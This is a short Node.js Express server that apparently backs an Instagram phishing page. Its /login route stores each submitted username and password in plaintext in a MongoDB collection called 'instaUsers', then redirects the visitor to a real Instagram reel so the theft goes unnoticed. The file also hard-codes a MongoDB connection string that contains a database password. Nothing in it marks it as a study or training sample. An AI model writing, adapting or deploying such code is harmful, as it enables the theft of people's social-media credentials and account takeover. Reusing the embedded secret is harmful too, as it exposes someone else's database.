const express = require('express');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

// MongoDB connection
const mongoClient = new MongoClient('mongodb+srv://click-counts:6mt-ywsT*hqZtrM@cluster0.4os8zzo.mongodb.net/CountDB?retryWrites=true&w=majority', { useUnifiedTopology: true });
let db;

mongoClient.connect()
    .then(() => {
        console.log('Connected to MongoDB');
        db = mongoClient.db('Instadb');
    })
    .catch(err => console.error('Error connecting to MongoDB:', err));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

async function createUsersCollection() {
    const usersCollection = db.collection('instaUsers');
    await usersCollection.createIndex({ username: 1 }, { unique: true });
    console.log('Users collection created or already exists');
}

app.post('/login', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    try {
        await createUsersCollection();

        const usersCollection = db.collection('instaUsers');
        await usersCollection.insertOne({ username, password });

        res.redirect('https://www.instagram.com/reel/CuqKIThBOKa/?igshid=NTc4MTIwNjQ2YQ==');
    } catch (err) {
        console.error('Error during registration:', err);
        res.send('An error occurred during registration');
    }
});


app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});